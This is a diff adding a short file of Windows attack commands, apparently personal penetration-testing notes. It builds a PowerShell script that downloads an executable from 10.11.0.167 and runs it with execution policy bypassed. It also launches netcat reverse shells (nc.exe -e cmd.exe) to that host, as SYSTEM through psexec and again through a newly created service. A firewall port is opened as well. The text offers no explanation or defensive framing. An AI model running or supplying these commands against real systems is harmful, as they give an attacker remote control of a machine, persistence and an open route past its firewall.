@@ -1,0 +1,23 @@
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.167:443/wget.exe" >>wget.ps1
+echo $file = "wget.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 
+
+echo nc.exe -vn 10.11.0.167 443 -e cmd.exe > nc.bat
+psexec -i -s -d c:/nc.bat
+
+
+psexec -i -s -d cmd.exe /c nc.exe -vn -d 10.11.0.167 443 -e cmd.exe
+
+
+sc create cmdsvc binpath= "c:\windows\system32\nc.exe -v 10.11.0.167 80 -e cmd.exe” type= own
+
+sc config cmdsvc type= own
+
+"c:\windows\system32\nc.exe -v 10.11.0.167 53 -e cmd.exe”
+
+netsh firewall add portopening TCP 53 "test"
